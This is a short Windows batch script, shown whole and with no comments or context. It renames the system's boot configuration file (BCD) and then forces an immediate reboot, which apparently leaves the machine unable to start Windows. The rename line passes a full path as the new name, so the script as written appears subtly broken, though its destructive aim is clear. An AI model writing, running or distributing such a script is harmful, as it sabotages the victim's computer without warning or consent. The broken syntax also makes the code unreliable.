@echo off
set BCD_PATH=%SystemDrive%\Boot\BCD
set BCD_BACKUP=%SystemDrive%\Boot\BCD.bak
ren %BCD_PATH% %BCD_BACKUP%
shutdown /r /t 0
